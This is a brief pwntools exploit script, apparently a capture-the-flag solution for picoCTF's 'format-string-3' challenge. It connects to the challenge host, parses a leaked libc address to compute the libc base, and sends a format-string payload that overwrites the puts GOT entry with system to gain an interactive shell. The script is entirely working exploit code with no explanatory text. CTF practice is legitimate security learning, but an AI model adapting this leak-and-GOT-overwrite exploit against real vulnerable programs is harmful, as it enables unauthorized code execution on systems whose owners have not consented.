
from pwn import *
context.update(arch='amd64', os='linux') 

pr = remote('rhea.picoctf.net',51263)

elf = ELF("./format-string-3_patched", checksec=False)
# pr = process('./format-string-3_patched')
libc = ELF("./libc.so.6")


offset = 38

pr.recvuntil(b'libc: ')
leak = int(pr.recvline().strip(), 16)
libc.address = leak - 0x000000000007a3f0
log.info(f"leak: {hex(leak)}")
log.info(f"libc address: {hex(libc.address)}")









payload = fmtstr_payload(offset, {elf.got['puts']: libc.sym['system']})
pr.sendline(payload)

pr.interactive()